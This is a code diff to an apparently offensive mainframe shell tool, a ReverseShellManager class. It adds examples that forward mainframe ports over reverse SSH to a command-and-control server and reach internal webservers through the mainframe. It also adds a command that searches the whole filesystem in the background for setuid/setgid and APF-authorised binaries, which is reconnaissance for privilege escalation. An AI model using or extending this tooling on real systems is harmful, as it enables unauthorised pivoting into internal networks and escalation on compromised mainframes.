@@ -27,9 +27,12 @@ class ReverseShellManager(WrappingShell):
 reverse connection.
 All the parameters are automatically derived from the current session.
 
-EXAMPLE:
+EXAMPLES:
     Forward port 23 on the mainframe to port 2323 on the cc server
-    > _runssh -R 2323:localhost:23"""
+    > _runssh -R 2323:localhost:23
+
+    Get access to a webserver as the mainframe:
+    > _runssh -R 8000:web.server.tld:80"""
         config = self.status_config
         ssh_step = Template(self.REVERSE_SH_SSH).substitute(
             KEYNAME=config['ftpkeyname'],
@@ -43,6 +46,19 @@ EXAMPLE:
         run_ssh_command = ssh_step + args + '&'
         print('Running in background: ' + run_ssh_command)
         self.default(run_ssh_command)
+
+    def do__findapf(self, args):
+        """Find the APF binaries by running a find conmmand into the output file.
+Access permission errors are redirected to /dev/null.
+
+USAGE:
+    _findapf /path/to/mainframe/output/file.txt"""
+        COMMAND = "find / -type f -ext a \( -perm -2000 -o -perm -4000 \) -o \( -ext a ! -name '*.so' ! -name '*.dll' \) -exec ls -E '{}' \;"
+        outfile = args.split()[0]
+        runme = '%s > %s 2>/dev/null &' % (COMMAND, outfile)
+        print("Running %s in background" % runme)
+        self.default(runme)
+
 
 if __name__ == '__main__':
     # Argument parsing
